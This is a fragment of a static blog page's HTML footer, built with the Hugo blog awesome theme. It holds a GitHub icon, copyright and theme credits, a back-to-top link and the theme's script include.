    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
    stroke-linecap="round" stroke-linejoin="round">
    <path
        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
    </path>
</svg>
</a>
</div>
    <small class="footer_copyright">
        © 2024 .
        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noreferrer noopener">Hugo blog awesome</a>
        theme on
        <a href="https://gohugo.io" target="_blank" rel="noreferrer noopener">Hugo</a>.
    </small>
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    
    
    
    <script src="https://0x-noname.github.io/js/script.min.46bd451490183d25f475c182f8fe773c1c787124cec75969e37c871d76aa151f.js" integrity="sha256-Rr1FFJAYPSX0dcGC&#43;P53PBx4cSTOx1lp43yHHXaqFR8="></script>


    </body>
</html>
